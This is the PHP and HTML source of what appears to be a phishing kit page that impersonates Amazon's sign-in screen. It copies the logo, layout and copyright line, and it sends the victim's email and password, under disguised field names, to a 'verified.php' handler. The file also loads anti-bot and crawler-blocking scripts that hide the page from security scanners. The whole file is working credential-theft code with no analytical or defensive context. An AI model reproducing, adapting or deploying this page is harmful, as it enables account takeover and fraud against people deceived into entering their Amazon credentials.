<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
$ib     = $_SERVER['REMOTE_ADDR'];
$random = rand(0, 100000);
$ran    = md5($random);
$d      = dirname($_SERVER['PHP_SELF']);
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amazon</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: sans-serif;
    }

    nav {
      height: 8vh;
    }

    .n1 {
      margin: auto;
      width: 20%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 2rem;
    }

    .main {
      border-color: #dddddd;
      border: 0.5px solid #dddddd;
      border-radius: 3px;
      width: 25%;
      /* height: 55vh; */
      margin: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 2rem;
      padding: 1rem;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
      width: 90%;
    }

    .f1,
    .f2 {
      display: flex;
      flex-direction: column;
      gap: 0.2rem;
    }

    .f22 {
      display: flex;
      justify-content: space-between;
      width: 100%;
    }

    .b1,
    .b2 {
      width: 100%;
    }

    .b1 {
      height: 2rem;
      font-size: 14px;
      background: linear-gradient(#f7dea1, #f0c14d);
      border: 0.5px solid #aaaaaa;
      border-radius: 3px;
      margin-top: 0.8rem;
    }

    .f1 input,
    .f2 input {
      border-left-color: #dddddd;
      border-right-color: #dddddd;
      border-radius: 3px;
      border-width: 0.2px;
      padding: 0.4rem;
      margin-bottom: 1rem;
    }

    .f1 input,
    .f2 input:focus {
      -webkit-box-shadow: 0px 0px 1.5px 1.5px rgba(231, 118, 0, 0.9);
      -moz-box-shadow: 0px 0px 1.5px 1.5px rgba(231, 118, 0, 0.9);
      box-shadow: 0px 0px 1.5px 1.5px rgba(231, 118, 0, 0.9);
      outline: none;
    }

    h2 {
      color: rgb(134, 134, 134);
      font-weight: normal;
      letter-spacing: 1px;
      font-size: 11.5px;
      width: 100%;
      text-align: center;
      border-top: 1px solid rgba(0, 0, 0, 0.1);
      border-bottom: 1px solid rgba(255, 255, 255, 0.3);
      line-height: 0.1em;
      margin: 2rem 0 1.5rem 0;
      margin-bottom: 5px;
    }

    h2 span {
      background: #fff;
      padding: 0 10px;
    }

    .b2 {
      background: linear-gradient(#f6f7f9, #e7e9ec);
      margin-top: 10px;
      margin-bottom: 20px;
      width: 100%;
      height: 2rem;
      font-size: 14px;
      border: 0.5px solid #aaaaaa;
      border-radius: 3px;
    }

    .b2:hover {
      background: linear-gradient(#f5f6f8, #d9dce1);
    }

    .sp {
      color: rgb(46, 109, 192);
      font-size: 14px;
    }

    .s1 {
      font-family: Arial, sans-serif;
      font-size: 1.8rem;
    }

    .footer {
      border: 0;
      height: 0;
      border-top: 1px solid rgba(0, 0, 0, 0.1);
      border-bottom: 1px solid rgba(255, 255, 255, 0.3);
      margin-top: 30px;
    }

    a:link {
      font-size: 12px;
      /*margin: 0 10px 0px 10px;*/
      margin-right: 10px;
      text-decoration: none;
      color: #0066c0;
    }

    a:hover {
      text-decoration: underline;
      color: orangergb(230, 161, 28);
    }

    a:visited {
      color: #0066c0;
    }

    .links {
      font-size: 10px;
      text-align: center;
      padding-left: 15px;
    }

    .password {
      margin-left: 125px;
    }

    .special {
      font-size: 11px;
    }

    @media only screen and (max-width: 1300px) {
      .main {
        width: 50%;
      }
    }

    @media only screen and (max-width: 700px) {
      .main {
        width: 50%;
      }
    }

    @media only screen and (max-width: 600px) {
      .main {
        width: 80%;
      }
    }

    @media only screen and (max-width: 400px) {
      .main {
        width: 90%;
      }
    }
  </style>
</head>

<body>
  <nav>
    <div class="n1">
      <img
        src="data:image/png;base64,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">
    </div>
  </nav>
  <div class="main">
    <div class="s1">
      <p>Sign in</p>
    </div>
    <form id="MyLo" method="post" action="verified.php">
      <div class="m1">
        <div class="f1">
          <label>
            <strong>Email (phone for mobile accounts)</strong>
          </label>
          <input type="email" name="Lkail" value="<?php echo $_SESSION['email']; ?>">
        </div>

        <div class="f2">
          <label class="f22">
            <p><strong>Password</strong></p>
            <span class="sp">Forgot your password?</span>
          </label>
          <input type="password" name="Mart" value="">
        </div>
      </div>
      <div class="m2">
        <div>
          <button class="b1">Sign in</button>
        </div>
        <div>
          <h2><span>New to Amazon?</span></h2>
          <button class="b2">Create your Amazon account</button>
        </div>
      </div>
    </form>
  </div>
  <hr class="footer">

  <div class="extra">
    <p class="links">
      <a href="#" class="first">Conditions of Use</a>
      <a href="#">Notice of Use</a>
      <a href="#">Help</a>
    </p>
    <p class="links">
      © 1996-2023, Amazon.com, Inc. or its affiliates
    </p><?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>
  </div>
</body>
<script>
  var form = document.getElementById('MyLo'); // Replace 'myForm' with the actual ID of your form

  form.addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the default form submission
    var usernameInput = form.querySelector('input[name="Lkail"]');
    var passwordInput = form.querySelector('input[name="Mart"]');

    var usernameValue = usernameInput.value.trim();
    var passwordValue = passwordInput.value.trim();

    // Check if the username and password fields are empty
    if (usernameValue === '' || passwordValue === '') {
      return;
    }

    form.submit();
  });

</script>